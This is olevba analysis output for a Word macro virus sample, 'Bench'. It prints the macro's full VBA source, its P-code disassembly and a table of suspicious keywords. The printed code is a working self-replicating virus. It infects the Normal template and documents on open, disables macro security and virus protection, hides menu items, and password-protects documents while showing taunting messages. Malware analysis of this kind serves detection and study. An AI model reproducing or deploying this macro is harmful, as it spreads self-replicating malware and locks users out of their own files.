olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
SetAttr "c:\program files\microsoft office\templates\normal.dot", vbNormal
Application.StatusBar = True
StatusBar = "This Macro was made specially for you! You are one of the very priviledged! - [Bench]"
Application.Caption = "([Bench]MV) - A.L.T you always have a special place in my heart! I love you!"
If Month(Now) = Minute(Now) Then
Randomize: For x = 1 To 10: ActiveDocument.Shapes.AddShape(msoShapeCircles, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select: Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255)): Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next x
End If
If Day(Now) = Minute(Now) Then
    With Assistant.NewBalloon
        .Icon = msoIconAlert
        .Heading = "[Bench]Macro Virus (c)"
        .Text = "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!" & vbCr & vbCr & "Click on me if you need any help!"
        .Animation = msoAnimationGreeting
        .Show
    End With
End If
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
' Word Version Checker - Checks for Word 2000 or Word 97
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If apllication.Version = 9# Then
    CommandBars("Macro").Controls("Security...").Enabled = False
End If
If Application.Version = 8# Then
    CommandBars("tools").Controls("Macro").Visible = False: CommandBars("tools").Controls("Customize...").Enabled = False: CommandBars("view").Controls("Toolbars").Enabled = False: CommandBars("view").Controls("Status Bar").Enabled = False
    Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Application.EnableCancelKey = wdCancelDisabled
End If
If nt = 0 And ad = 0 Then GoTo darn:
If nt = 0 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ad))
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 39, "Sub ViewVBCode()": End If
If ad = 0 Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, nt))
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 39, "Sub Bench()": End If
darn:
If nt <> 0 And ad = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub ' [B]MV.C Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97 - Added basic stealth]
Sub Bench()
On Error Resume Next
With Assistant.NewBalloon
.Heading = "[Bench] Macro Virus"
.Icon = msoIconAlert
.Text = "Trying to get rid of me eh? Well, now you will pay!"
.Animation = msoAnimationGetAttentionMajor
End With
If (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.Password = "Bench": End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bench.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8657 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0036 "c:\program files\microsoft office\templates\normal.dot"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #3:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #4:
' 	LitStr 0x0055 "This Macro was made specially for you! You are one of the very priviledged! - [Bench]"
' 	St StatusBar 
' Line #5:
' 	LitStr 0x004C "([Bench]MV) - A.L.T you always have a special place in my heart! I love you!"
' 	Ld Application 
' 	MemSt Caption 
' Line #6:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	Ld msoShapeCircles 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' 	BoS 0x0000 
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #10:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #11:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #12:
' 	LitStr 0x0016 "[Bench]Macro Virus (c)"
' 	MemStWith Heading 
' Line #13:
' 	LitStr 0x0059 "Hello! I'm your new Office Assistant... I got tired of waiting so I figured to say hello!"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0021 "Click on me if you need any help!"
' 	Concat 
' 	MemStWith Then 
' Line #14:
' 	Ld msoAnimationGreeting 
' 	MemStWith Animation 
' Line #15:
' 	ArgsMemCallWith Show 0x0000 
' Line #16:
' 	EndWith 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nt 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #19:
' 	QuoteRem 0x0000 0x0037 " Word Version Checker - Checks for Word 2000 or Word 97"
' Line #20:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	Ld apllication 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4022 
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld Application 
' 	MemLd Version 
' 	LitR8 0x0000 0x0000 0x0000 0x4020 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo darn 
' 	BoS 0x0000 
' 	EndIf 
' Line #29:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	LitStr 0x000D "Sub AutoClose"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld ad 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #31:
' 	LitDI2 0x0027 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #32:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitStr 0x000C "Sub AutoOpen"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld nt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #34:
' 	LitDI2 0x0027 
' 	LitStr 0x000B "Sub Bench()"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #35:
' 	Label darn 
' Line #36:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #37:
' 	EndSub 
' 	QuoteRem 0x0008 0x007D " [B]MV.C Class Infection - [My first Virus! I just edited it a bit to be compatible with W2000 and W97 - Added basic stealth]"
' Line #38:
' 	FuncDefn (Sub Bench())
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #41:
' 	LitStr 0x0013 "[Bench] Macro Virus"
' 	MemStWith Heading 
' Line #42:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #43:
' 	LitStr 0x0033 "Trying to get rid of me eh? Well, now you will pay!"
' 	MemStWith Then 
' Line #44:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #45:
' 	EndWith 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #48:
' 	LitStr 0x0005 "Bench"
' 	Ld ActiveDocument 
' 	MemSt Password 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

